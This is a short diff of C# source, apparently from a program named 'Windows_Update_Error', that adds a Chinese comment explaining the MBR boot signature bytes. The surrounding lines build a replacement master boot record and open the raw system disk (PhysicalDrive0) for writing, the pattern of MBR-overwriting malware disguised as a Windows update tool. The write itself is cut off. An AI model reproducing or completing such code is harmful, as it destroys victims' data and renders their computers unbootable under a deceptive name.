@@ -40,7 +40,7 @@ namespace Windows_Update_Error
                 mbrdata[i] = mbr1[i];
             }
             mbrdata[510] = 0x55;
-            mbrdata[511] = 0xAA;
+            mbrdata[511] = 0xAA;           ////0x55和0xAA是编写MBR结尾时所必需的
             string Path = @"\\.\PhysicalDrive0";
             using (FileStream file = new FileStream(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))         //创建FileStream对象
             {
